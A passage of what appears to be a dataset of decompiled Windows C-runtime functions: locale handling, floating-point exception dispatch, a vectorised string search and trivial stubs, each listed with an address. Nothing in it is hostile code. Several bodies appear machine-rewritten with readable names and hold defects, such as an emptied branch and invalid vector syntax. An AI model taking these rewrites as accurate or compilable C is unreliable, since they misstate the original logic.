0x3a8) & 0xfffffffd;\n}\nLAB_14001687d:\n__security_check_cookie(local_40 ^ (ulonglong)auStackY_c8);\nreturn extraout_RAX;\n}\nLocal Variable: local_40 : undefined8\nLocal Variable: local_47 : undefined1\nLocal Variable: local_48 : undefined\nLocal Variable: local_50 : undefined8\nLocal Variable: local_58 : undefined1\nLocal Variable: local_5f : undefined\nLocal Variable: local_68 : undefined8\nLocal Variable: local_70 : undefined8\nLocal Variable: local_78 : undefined8\nLocal Variable: local_80 : undefined8\nLocal Variable: local_88 : undefined4\nLocal Variable: local_90 : undefined8\nLocal Variable: local_98 : undefined8\nLocal Variable: local_a0 : undefined4\nLocal Variable: local_a8 : undefined8"}
{"Function Name": "__acrt_locale_release_lc_time_reference", "Address": "14001b284", "Source Code": "int __acrt_locale_release_lc_time_reference(undefined **locale_ref_ptr)\n{\n    \n    if (locale_ref_ptr != (undefined **)0x0 && locale_ref_ptr != &PTR_DAT_140029b20) {\n        LOCK(); \n        int *ref_counter_ptr = (int *)((longlong)locale_ref_ptr + 0x15c); \n        int current_ref_count = *ref_counter_ptr; \n        *ref_counter_ptr = current_ref_count - 1; \n        UNLOCK(); \n        return current_ref_count - 1; \n    }\n    return 0x7fffffff; \n}"}
{"Function Name": "__acrt_get_qualified_locale_downlevel", "Address": "14001c614", "Source Code": "void __acrt_get_qualified_locale_downlevel(longlong locale_param, UINT *code_page_ptr, LPWSTR locale_name_buffer)\n{\n    longlong *thread_local_data_ptr; \n    short *short_ptr; \n    UINT code_page_value; \n    BOOL is_valid; \n    longlong thread_local_data_1; \n    longlong thread_local_data_2; \n    ulonglong translated_name_result; \n    undefined1 stack_space[32]; \n    undefined8 locale_info; \n    LCID locale_id; \n    locale_info = 0; \n    locale_id = 0; \n    thread_local_data_1 = __acrt_getptd(); \n    thread_local_data_2 = __acrt_getptd(); \n    thread_local_data_ptr = (longlong *)(thread_local_data_1 + 0xa0); \n    *(undefined8 **)(thread_local_data_2 + 0x3a0) = &locale_info; \n    short_ptr = (short *)(locale_param + 0x80); \n    *(longlong *)(thread_local_data_1 + 0x98) = locale_param; \n    *thread_local_data_ptr = (longlong)short_ptr; \n    \n    if ((short_ptr != (short *)0x0) && (*short_ptr != 0)) {\n        TranslateName(0x14002c470, DAT_14002c5e0 + -1, thread_local_data_ptr); \n    }\n    translated_name_result = locale_info; \n    locale_info = locale_info & 0xffffffff00000000; \n    \n    if ((*(short **)(thread_local_data_1 + 0x98) == (short *)0x0) || (**(short **)(thread_local_data_1 + 0x98) == 0)) {\n        \n        if (((short *)*thread_local_data_ptr == (short *)0x0) || (*(short *)*thread_local_data_ptr == 0)) {\n            locale_info._4_4_ = SUB84(translated_name_result, 4); \n            locale_info = CONCAT44(locale_info._4_4_, 0x104); \n            locale_id = GetUserDefaultLCID(); \n            locale_info = CONCAT44(locale_id, (uint)locale_info); \n        } else {\n            thread_local_data_2 = __acrt_getptd(); \n            longlong lVar8 = -1; \n            do {\n                lVar8 = lVar8 + 1; \n            } while (*(short *)(*(longlong *)(thread_local_data_2 + 0xa0) + lVar8 * 2) != 0); \n            *(uint *)(thread_local_data_2 + 0xb4) = (uint)(lVar8 == 3); \n            EnumSystemLocalesW(FUN_14001be44, 1); \n            \n            if ((locale_info & 4) == 0) {\n                locale_info = locale_info & 0xffffffff00000000; \n            }\n        }\n    } else {\n        \n        if (((short *)*thread_local_data_ptr == (short *)0x0) || (*(short *)*thread_local_data_ptr == 0)) {\n            GetLcidFromLanguage((byte *)&locale_info); \n        } else {\n            GetLcidFromLangCountry((uint *)&locale_info); \n        }\n        \n        if ((uint)locale_info == 0) {\n            translated_name_result = TranslateName(0x14002c050, DAT_14002c460 + -1, (longlong *)(thread_local_data_1 + 0x98)); \n            \n            if ((char)translated_name_result != '\\0') {\n                \n                if (((short *)*thread_local_data_ptr == (short *)0x0) || (*(short *)*thread_local_data_ptr == 0)) {\n                    GetLcidFromLanguage((byte *)&locale_info); \n                } else {\n                    GetLcidFromLangCountry((uint *)&locale_info); \n                }\n            }\n        }\n    }\n    \n    code_page_value = ProcessCodePage((wchar_t *)(-(ulonglong)(locale_param != 0) & locale_param + 0x100U), (longlong)&locale_info);\n    \n    if ((code_page_value != 0) && (is_valid = IsValidCodePage(code_page_value & 0xffff), is_valid != 0)) {\n        is_valid = IsValidLocale(locale_info._4_4_, 1); \n        \n        if (is_valid != 0) {\n            if (code_page_ptr != (UINT *)0x0) {\n                *code_page_ptr = code_page_value; \n            }\n            __acrt_LCIDToLocaleName(locale_info._4_4_, (wchar_t *)(thread_local_data_1 + 0x2f0), 0x55); \n            \n            if (locale_name_buffer != (LPWSTR)0x0) {\n                __acrt_LCIDToLocaleName(locale_info._4_4_, locale_name_buffer + 0x90, 0x55); \n                int iVar4 = GetLocaleInfoW(locale_info._4_4_, 0x1001, locale_name_buffer, 0x40); \n                \n                if ((iVar4 != 0) && (iVar4 = GetLocaleInfoW(locale_id, 0x1002, locale_name_buffer + 0x40, 0x40), iVar4 != 0)) {\n                    _itow_s(code_page_value, locale_name_buffer + 0x80, 0x10, 10); \n                }\n            }\n        }\n    }\n    __security_check_cookie(*(ulonglong *)&stack_space ^ (ulonglong)stack_space); \n    return; \n}"}
{"Function Name": "FUN_14001d1f0", "Address": "14001d1f0", "Source Code": "void FUN_14001d1f0(undefined8 input_param_1, uint input_param_2, undefined8 input_param_3, int input_param_4, uint input_param_5,\n                   uint input_param_6, undefined8 input_param_7, undefined8 input_param_8, int input_param_9)\n{\n    bool is_exception_enabled; \n    uint control_floating_point_state; \n    undefined8 temp_param_copy; \n    undefined8 control_state_copy; \n    uint exception_info_array[12]; \n    ulonglong security_cookie; \n    \n    security_cookie = DAT_140038080 ^ (ulonglong)&temp_param_copy;\n    \n    \n    control_floating_point_state = _ctrlfp(0x1f80, 0xffc0);\n    control_state_copy = (undefined8)control_floating_point_state; \n    temp_param_copy = input_param_3; \n    is_exception_enabled = _exception_enabled(input_param_5, control_state_copy); \n    \n    \n    if (!is_exception_enabled) {\n        \n        if (input_param_9 == 2) {\n            temp_param_copy = input_param_8;\n        }\n        \n        _raise_exc(exception_info_array, &control_state_copy, (ulonglong)input_param_5, input_param_2, (uint *)&input_param_7, (uint *)&temp_param_copy);\n    }\n    \n    \n    is_exception_enabled = FUN_14001339c();\n    \n    if (is_exception_enabled && input_param_4 != 0) {\n        \n        FUN_14001d0cc(input_param_4, (ulonglong)input_param_6, input_param_1, input_param_7, input_param_8, temp_param_copy, (uint)control_state_copy);\n    } else {\n        \n        _set_errno_from_matherr(input_param_4);\n        \n        _ctrlfp((uint)control_state_copy, 0xffc0);\n    }\n    \n    \n    __security_check_cookie(security_cookie ^ (ulonglong)&temp_param_copy);\n    return; \n}"}
{"Function Name": "FUN_14001d318", "Address": "14001d318", "Source Code": "void FUN_14001d318(undefined8 input_param, uint control_param, float float_param_1, int error_param, uint exception_param,\n                   uint control_param_2, float float_param_2, float float_param_3, int check_param)\n{\n    bool is_exception_enabled; \n    uint control_state; \n    undefined4 extra_output_00; \n    undefined7 extra_output; \n    undefined1 local_stack_space[32]; \n    ulonglong security_check_value; \n    \n    security_check_value = DAT_140038080 ^ (ulonglong)local_stack_space;\n    \n    \n    control_state = _ctrlfp(0x1f80, 0xffc0);\n    \n    \n    is_exception_enabled = _exception_enabled(exception_param, CONCAT44(extra_output_00, control_state));\n    \n    if (!is_exception_enabled) { \n        if (check_param == 2) {\n            \n        }\n        \n        _raise_excf(NULL, NULL, (ulonglong)exception_param, control_param, (uint *)&float_param_2, (uint *)&float_param_1);\n    }\n    \n    \n    is_exception_enabled = FUN_14001339c();\n    \n    if (is_exception_enabled && error_param != 0) { \n        \n        FUN_14001d0cc(error_param, (ulonglong)control_param_2, input_param, (double)float_param_2, (double)float_param_3, (double)float_param_1, (uint)CONCAT44(extra_output_00, control_state));\n    } else {\n        \n        _set_errno_from_matherr(error_param);\n        \n        _ctrlfp((uint)CONCAT44(extra_output_00, control_state), 0xffc0);\n    }\n    \n    \n    __security_check_cookie(security_check_value ^ (ulonglong)local_stack_space);\n    return; \n}"}
{"Function Name": "FUN_14001f950", "Address": "14001f950", "Source Code": "ushort * FUN_14001f950(ushort *input_array, ushort search_value)\n{\n    uint first_match_index; \n    ushort *found_element_ptr; \n    undefined1 shuffled_values[16]; \n    undefined1 match_flags[16]; \n    ushort comparison_results; \n    \n    shuffled_values = pshuflw(in_XMM1, ZEXT216(search_value), 0);\n    do {\n        \n        if (((uint)input_array & 0xfff) < 0xff1) {\n            \n            match_flags._0_2_ = -(ushort)(*input_array == 0);\n            match_flags._2_2_ = -(ushort)(input_array[1] == 0);\n            match_flags._4_2_ = -(ushort)(input_array[2] == 0);\n            match_flags._6_2_ = -(ushort)(input_array[3] == 0);\n            match_flags._8_2_ = -(ushort)(input_array[4] == 0);\n            match_flags._10_2_ = -(ushort)(input_array[5] == 0);\n            match_flags._12_2_ = -(ushort)(input_array[6] == 0);\n            match_flags._14_2_ = -(ushort)(input_array[7] == 0);\n            comparison_results = shuffled_values._0_2_; \n            \n            match_flags |= (undefined1) { \n                -(ushort)(*input_array == comparison_results),\n                -(ushort)(input_array[1] == shuffled_values._2_2_),\n                -(ushort)(input_array[2] == comparison_results),\n                -(ushort)(input_array[3] == shuffled_values._2_2_),\n                -(ushort)(input_array[4] == comparison_results),\n                -(ushort)(input_array[5] == shuffled_values._2_2_),\n                -(ushort)(input_array[6] == comparison_results),\n                -(ushort)(input_array[7] == shuffled_values._2_2_)\n            };\n            \n            comparison_results = (ushort)(SUB161(match_flags >> 7, 0) & 1) | (ushort)(SUB161(match_flags >> 0xf, 0) & 1) << 1 |\n                    (ushort)(SUB161(match_flags >> 0x17, 0) & 1) << 2 | (ushort)(SUB161(match_flags >> 0x1f, 0) & 1) << 3 |\n                    (ushort)(SUB161(match_flags >> 0x27, 0) & 1) << 4 | (ushort)(SUB161(match_flags >> 0x2f, 0) & 1) << 5 |\n                    (ushort)(SUB161(match_flags >> 0x37, 0) & 1) << 6 | (ushort)(SUB161(match_flags >> 0x3f, 0) & 1) << 7 |\n                    (ushort)(SUB161(match_flags >> 0x47, 0) & 1) << 8 | (ushort)(SUB161(match_flags >> 0x4f, 0) & 1) << 9 |\n                    (ushort)(SUB161(match_flags >> 0x57, 0) & 1) << 10 | (ushort)(SUB161(match_flags >> 0x5f, 0) & 1) << 0xb |\n                    (ushort)(SUB161(match_flags >> 0x67, 0) & 1) << 0xc | (ushort)(SUB161(match_flags >> 0x6f, 0) & 1) << 0xd |\n                    (ushort)(SUB161(match_flags >> 0x77, 0) & 1) << 0xe | (ushort)(byte)(match_flags[0xf] >> 7) << 0xf;\n            \n            if (comparison_results != 0) {\n                first_match_index = 0; \n                \n                while ((comparison_results >> first_match_index & 1) == 0) {\n                    first_match_index++;\n                }\n                found_element_ptr = (ushort *)0x0; \n                \n                if (*(ushort *)((longlong)input_array + (ulonglong)first_match_index) == search_value) {\n                    found_element_ptr = (ushort *)((longlong)input_array + (ulonglong)first_match_index); \n                }\n                return found_element_ptr; \n            }\n        } else {\n            \n            if (*input_array == search_value) {\n                return input_array; \n            }\n            if (*input_array == 0) {\n                return (ushort *)0x0; \n            }\n        }\n        input_array = (ushort *)((longlong)input_array + 2); \n    } while (true); \n}"}
{"Function Name": "KERNEL32.DLL::DeleteCriticalSection", "Address": "14000a000", "Source Code": "void __stdcall DeleteCriticalSection(LPCRITICAL_SECTION lpCriticalSection)\n{\nDeleteCriticalSection(lpCriticalSection);\nreturn;\n}"}
{"Function Name": "FUN_140007920", "Address": "140007920", "Source Code": "undefined8 FUN_140007920(void)\n{\nreturn 0xffffffff;\n}"}
{"Function Name": "FUN_14000b974", "Address": "14000b974", "Source Code": "undefined8 FUN_14000b974(void)\n{\nreturn 0x4000;\n}"}
{"Function Name": "FUN_140007740", "Address": "140007740", "Source Code": "undefined8 FUN_140007740(void)\n{\nreturn 0;\n}"}
{"Function Name": "Catch@14001fad8", "Address": "14001fad8", "Source Code": "undefined8 Catch_14001fad8(void)\n{\nreturn 0x1400030b4;\n}\nLocal Variable: local_res10 : undefined8"}
{"Function Name": "Catch_All@14001fe10", "Address": "14001fe10", "Source Code": "undefined8 Catch_All_14001fe10(void)\n{\nreturn 0x140008ad0;\n}\nLocal Variable: local_res10 : undefined8"}
{"Function Name": "KERNEL32.DLL::EnterCriticalSection", "Address": "14000a018", "Source Code": "void __stdcall EnterCriticalSection(LPCRITICAL_SECTION lpCriticalSection)\n{\nEnterCriticalSection(lpCriticalSection);\nreturn;\n}"}
{"Function Name": "FUN_14000b98c", "Address": "14000b98c", "Source Code": "undefined1 FUN_14000b98c(void)\n{\nreturn 1;\n}"}
{"Function Name": "FUN_14000e8d0", "Address": "14000e8d0", "Source Code": "void FUN_14000e8d0(void)\n{\nreturn;\n}"}
{"Function Name": "_guard_check_icall", "Address": "140007730", "Source Code": "void _guard_check_icall(void)\n{\nreturn;\n}"}
{"Function Name": "thunk_FUN_140007740", "Address": "14000b824", "Source Code": "undefined8 thunk_FUN_140007740(void)\n{\nreturn 0;\n}"}
{"Function Name": "FUN_14000e8e0", "Address": "14000e8e0", "Source Code": "void FUN_14000e8e0(void)\n{\nreturn;\n}"}
{"Function Name": "KERNEL32.DLL::LeaveCriticalSection", "Address": "14000a020", "Source Code": "void __stdcall LeaveCriticalSection(LPCRITICAL_SECTION lpCriticalSection)\n{\nLeaveCriticalSection(lpCriticalSection);\nreturn;\n}"}
{"Function Name": "FUN_14000234d", "Address": "14000234d", "Source Code": "void FUN_14000234d(void)\n{\nreturn;\n}"}
{"Function Name": "FUN_14000b680", "Address": "14000b680", "Source Code": "undefined8 FUN_14000b680(void)\n{\nreturn 1;\n}"}
{"Function Name": "FUN_1400022dd", "Address": "1400022dd", "Source Code": "void FUN_1400022dd(void)\n{\nreturn;\n}"}
